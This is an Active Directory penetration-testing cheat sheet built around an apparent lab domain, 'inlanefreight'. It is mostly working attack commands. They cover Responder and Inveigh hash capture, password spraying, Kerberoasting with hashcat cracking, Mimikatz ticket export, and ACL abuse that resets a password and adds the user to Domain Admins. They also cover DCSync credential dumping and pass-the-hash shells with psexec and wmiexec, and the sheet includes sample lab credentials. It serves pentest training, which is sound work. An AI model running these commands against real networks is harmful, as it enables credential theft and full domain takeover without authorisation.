# Comprehensive Active Directory Penetration Testing Cheat Sheet

This guide provides a structured and extended overview of commands used during an Active Directory penetration test, from initial reconnaissance to gaining and maintaining privileged access.

---

## 🕵️ Reconnaissance (OSINT)

This phase involves gathering information from publicly available sources to understand the target's structure without directly interacting with their systems.

### DNS & Domain Information
* **Purpose**: To gather information about the domain's infrastructure.
* **Look for**: Subdomains, IP ranges, mail server (MX) records, and nameserver (NS) records.
* **Tools**:
    * **viewdns.info**: A web-based tool for comprehensive DNS and domain analysis.
    * **nslookup**: Queries DNS servers for domain names or IP address mappings.
        ```shell
        nslookup ns1.inlanefreight.com
        ```

### Username & Email Harvesting
* **Purpose**: To build a list of potential usernames and email addresses for subsequent attacks.
* **Look for**: Username formats (e.g., `f.last`, `flast`), and a list of valid email addresses.
* **Tools**:
    * **linkedin2username**: Generates username lists from LinkedIn employee data.
    * **Google Dorking**: Uses advanced Google search operators to find indexed information.
        ```shell
        # Find PDF files on the target domain that may contain metadata or names
        filetype:pdf inurl:inlanefreight.com
        
        # Find email addresses on the target domain
        intext:"@inlanefreight.com" inurl:inlanefreight.com
        ```

### Credential Leak Discovery
* **Purpose**: To find credentials that have been exposed in public data breaches.
* **Look for**: Leaked usernames, email addresses, and passwords associated with the domain.
* **Tools**:
    * **dehashed.py**: A script to query the Dehashed API.
        ```shell
        sudo python3 dehashed.py -q inlanefreight.local -p
        ```

---

## 📡 Initial Enumeration & Network Scanning

This phase focuses on actively scanning the internal network to identify live hosts, open ports, services, and potential vulnerabilities.

### Network Traffic Analysis
* **Purpose**: To capture and analyze network traffic to understand communications and potentially capture credentials.
* **Look for**: LLMNR/NBT-NS traffic, broadcast requests, ARP traffic, and cleartext credentials.
* **Tools**:
    * **Wireshark**: A GUI-based network protocol analyzer.
        ```shell
        sudo -E wireshark
        ```
    * **tcpdump**: A command-line packet analyzer.
        ```shell
        sudo tcpdump -i ens224
        ```

### Host Discovery & Port Scanning
* **Purpose**: To identify live hosts and their open ports and services.
* **Look for**: A list of responsive IP addresses and common AD ports (88, 135, 139, 389, 445, 636, 3268, 3269, 5985, 5986).
* **Tools**:
    * **fping**: A tool for quickly pinging a network range to find live hosts.
        ```shell
        fping -asgq 172.16.5.0/23
        ```
    * **Nmap**: A powerful network scanner.
        ```shell
        # Aggressive scan on a single host
        nmap -A 172.16.5.100
        
        # Verbose, aggressive scan on a list of hosts, saving output
        sudo nmap -v -A -iL hosts.txt -oN /home/user/host-enum
        
        # Fast, aggressive scan on a subnet, outputting in Grepable format
        sudo nmap -A -Pn -T5 -oG ./nmapOutput 172.16.5.0/23
        ```

---

## 👤 User & Domain Enumeration

Once a Domain Controller is identified, the next step is to find valid usernames and understand the domain's policies.

### Enumerating Domain Information
* **Purpose**: To gather details about the domain, its policies, and users without authentication (null session).
* **Look for**: Domain SID, password policy (length, complexity, lockout threshold), and lists of users and groups.
* **Tools**:
    * **CrackMapExec**: Checks password policy.
        ```shell
        crackmapexec smb 172.16.5.5 -u '' -p '' --pass-pol
        ```
    * **rpcclient**: Queries domain information via RPC.
        ```shell
        rpcclient -U "" -N 172.16.5.5
        > querydominfo
        ```
    * **enum4linux / enum4linux-ng**: A comprehensive enumeration tool.
        ```shell
        enum4linux-ng -P 172.16.5.5 -oA ilfreight
        ```
    * **ldapsearch**: Queries password policy attributes via LDAP.
        ```shell
        ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
        ```
    * **PowerView**: A PowerShell tool for domain enumeration.
        ```powershell
        Import-Module .\PowerView.ps1
        Get-DomainPolicy
        ```
    * **net commands (Windows)**: Native Windows commands for domain info. Note the error codes for failed authentication attempts.
        ```powershell
        # Attempt to connect to the IPC$ share as a null user
        net use \\DC01\ipc$ "" /u:""
        # Error 1326: bad username/password, 1331: account disabled, 1909: account locked
        
        # View domain account policies
        net accounts
        ```

### Username Enumeration Techniques
* **Purpose**: To build a list of valid domain usernames.
* **Look for**: A clean list of usernames.
* **Tools**:
    * **Kerbrute**: A tool for enumerating valid AD accounts through Kerberos pre-authentication without causing lockouts.
        ```shell
        # Setup Kerbrute
        sudo git clone [https://github.com/ropnop/kerbrute.git](https://github.com/ropnop/kerbrute.git)
        cd kerbrute && sudo make all
        sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
        
        # Enumerate users from a list
        kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 users.txt -o valid_users.txt
        
        # Enumerate and format the output to get only usernames
        kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 users.txt | awk '/VALID USERNAME/ {print $7}' | cut -d '@' -f 1 > valid_users.txt
        ```
    * **Other Tools**:
        ```shell
        # Using CrackMapExec
        crackmapexec smb 172.16.5.5 --users
        
        # Using ldapsearch
        ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" "(&(objectclass=user))" | grep sAMAccountName:
        
        # Using windapsearch
        ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
        ```

---

## 🎣 LLMNR/NBT-NS Poisoning

This attack intercepts name resolution requests on a local network to capture credentials when a user tries to access a non-existent network share.

### Capturing Hashes (Linux)
* **Purpose**: Use Responder to poison requests and capture NTLMv2 hashes.
* **Look for**: Captured hashes in the Responder output, which can be cracked offline.
* **Commands**:
    ```shell
    # Start Responder to listen on a specific interface
    sudo responder -I ens224
    
    # Crack the captured hash with Hashcat (mode 5600 for NTLMv2)
    hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
    ```

### Capturing Hashes (Windows)
* **Purpose**: Use Inveigh (a PowerShell tool) to perform the same attack from a Windows host.
* **Look for**: Captured hashes in the Inveigh console output.
* **Commands**:
    ```powershell
    # Import the Inveigh module
    Import-Module .\Inveigh.ps1
    
    # Start the listener
    Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
    ```

---

## 💧 Password Spraying

This technique involves trying a small number of common passwords against a large list of usernames to find valid credentials while avoiding account lockouts.

### Password Spraying (Linux)
* **Purpose**: To identify users with weak, common passwords.
* **Look for**: Successful authentication messages or a `+` symbol in CrackMapExec's output.
* **Commands**:
    ```shell
    # Using Kerbrute
    kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
    
    # Using CrackMapExec
    sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep '+'
    
    # Using a simple for loop with rpcclient
    for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
    ```

### Password Spraying (Windows)
* **Purpose**: Perform the attack using a PowerShell-based tool.
* **Look for**: Successful logins written to the specified output file.
* **Commands**:
    ```powershell
    Import-Module .\DomainPasswordSpray.ps1
    Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
    ```

---

## 📜 Credentialed Enumeration

Once you have valid credentials, you can perform a much deeper enumeration of the domain.

### Enumeration from Linux
* **Purpose**: To use credentials to gather extensive information about the domain from a Linux host.
* **Look for**: Domain Admins, sensitive groups, accessible shares, and high-privilege user sessions.
* **Tools**:
    * **CrackMapExec**: A versatile tool for post-exploitation.
        ```shell
        # Enumerate domain users, groups, and shares
        sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
        sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
        sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
        
        # Find logged-on users
        sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
        
        # Spider a file share for interesting files
        sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
        ```
    * **smbmap**: Lists share permissions and content.
        ```shell
        smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
        ```
    * **windapsearch**: A Python script for LDAP enumeration.
        ```shell
        python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
        ```
    * **BloodHound**: Collects data to find attack paths.
        ```shell
        sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
        ```

### Enumeration from Windows
* **Purpose**: To use credentials to enumerate the domain from a compromised Windows host.
* **Look for**: Trusts, group memberships, and sensitive data on file shares.
* **Tools**:
    * **Active Directory PowerShell Module / PowerView**:
        ```powershell
        # Get AD Trusts
        Get-ADTrust -Filter *
        
        # Get members of a group
        Get-ADGroupMember -Identity "Backup Operators"
        
        # Get all members of Domain Admins, recursively
        Get-DomainGroupMember -Identity "Domain Admins" -Recurse
        ```
    * **SharpView**: A .NET port of PowerView.
        ```powershell
        .\SharpView.exe Get-DomainUser -Identity forend
        ```
    * **Snaffler**: A tool for finding sensitive data on file shares.
        ```powershell
        .\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v
        ```
    * **SharpHound**: The C# data collector for BloodHound.
        ```powershell
        .\SharpHound.exe -c All --zipfilename ILFREIGHT.zip
        ```

---

## 🔥 Kerberoasting

This attack requests a Kerberos ticket (TGS) for a service account and cracks its hash offline.

### Kerberoasting from Linux
* **Purpose**: To use Impacket's `GetUserSPNs.py` to request and crack service tickets.
* **Look for**: TGS hashes that can be cracked offline.
* **Commands**:
    ```shell
    # Request a TGS for a specific user and save it
    GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
    
    # Crack the hash with Hashcat (mode 13100)
    hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
    ```

### Kerberoasting from Windows
* **Purpose**: To use tools like Rubeus or PowerView to request and extract TGS tickets.
* **Look for**: Hashcat-formatted TGS hashes.
* **Commands**:
    * **Rubeus**: A comprehensive Kerberos interaction tool.
        ```powershell
        # Find and roast all kerberoastable accounts
        .\Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
        
        # Roast accounts with admincount=1
        .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
        ```
    * **PowerView**:
        ```powershell
        # Get a hash for a specific user in Hashcat format
        Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
        ```
    * **Mimikatz**: Can be used to export Kerberos tickets from memory for offline cracking.
        ```powershell
        # List and export tickets from the current session
        kerberos::list /export
        ```

---

## 🌳 Post-Exploitation & Living Off The Land

Commands to run after gaining access to a Windows host to understand the environment and find privilege escalation opportunities.

### System & Environment Enumeration
* **Purpose**: To gather information about the local system and its security configurations.
* **Look for**: Antivirus status, PowerShell version, AppLocker policies, firewall rules, and network configuration.
* **Commands**:
    ```powershell
    # Check AV status
    Get-MpComputerStatus
    
    # Check AppLocker policy
    Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
    
    # Check PowerShell language mode
    $ExecutionContext.SessionState.LanguageMode
    
    # Check for LAPS (Local Administrator Password Solution)
    Find-LAPSDelegatedGroups
    Get-LAPSComputers
    
    # List environment variables
    Get-ChildItem Env: | ft key,value
    
    # List firewall rules
    netsh advfirewall show allprofiles
    
    # See who else is logged on
    qwinsta
    
    # View network connections and routes
    arp -a
    route print
    ```

### Domain Enumeration with Native Tools
* **Purpose**: To query Active Directory using built-in Windows commands.
* **Look for**: Domain groups, user details, and computers.
* **Commands**:
    ```powershell
    # List domain groups
    net group /domain
    
    # Get info about a specific domain user
    net user wrouse /domain
    
    # List local administrators on the current machine
    net localgroup Administrators
    
    # Query for specific objects using dsquery
    dsquery user
    dsquery computer
    # Find users with "Password Not Required" flag
    dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))"
    # Find users with "Do not require Kerberos preauthentication"
    dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
    ```

---

## 👑 Privilege Escalation & Persistence

Techniques to elevate privileges to Domain Admin and maintain access.

### Abusing ACLs & GPOs
* **Purpose**: To find and exploit misconfigured Access Control Lists or Group Policy Objects.
* **Look for**: Permissions like `GenericAll`, `GenericWrite`, `WriteDACL`, or `WriteOwner` over privileged users, groups, or GPOs.
* **Commands**:
    ```powershell
    # Using PowerView to find interesting ACLs
    Find-InterestingDomainAcl
    
    # Get the ACL for a specific object for a specific user
    $sid = Convert-NameToSid wley
    Get-DomainObjectACL -Identity "Domain Admins" | ? {$_.SecurityIdentifier -eq $sid}
    
    # If you have write access, reset a user's password
    $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
    Set-DomainUserPassword -Identity damundsen -AccountPassword $SecPassword -Credential $Cred
    
    # Add a user to a privileged group
    Add-DomainGroupMember -Identity 'Domain Admins' -Members 'damundsen' -Credential $Cred
    ```

### DCSync Attack
* **Purpose**: To impersonate a Domain Controller and request password hashes using replication privileges.
* **Look for**: A user with `GetChanges` and `GetChangesAll` extended rights on the domain object.
* **Commands**:
    ```powershell
    # Find users with DCSync rights using PowerView
    $sid = (Get-DomainUser -Identity someuser).ObjectSID
    Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ? {$_.SecurityIdentifier -match $sid}
    
    # Execute DCSync with secretsdump.py
    secretsdump.py -just-dc INLANEFREIGHT/adunn@172.16.5.5 -outputfile hashes
    
    # Execute DCSync with mimikatz
    mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:administrator" "exit"
    ```

### Privileged Access & Lateral Movement (Pass-the-Hash)
* **Purpose**: To use NTLM hashes to authenticate to other systems without the plaintext password.
* **Look for**: Successful authentication and shell access (`(Pwn3d!)` in CME).
* **Commands**:
    ```shell
    # Using CrackMapExec with a hash
    sudo crackmapexec smb 172.16.5.0/23 -u administrator -H <NTLM_HASH>
    
    # Using psexec.py from Impacket for a remote shell
    psexec.py -hashes :<NTLM_HASH> INLANEFREIGHT/administrator@172.16.5.5
    
    # Using wmiexec.py for a semi-interactive shell
    wmiexec.py -hashes :<NTLM_HASH> INLANEFREIGHT/administrator@172.16.5.5
    ```
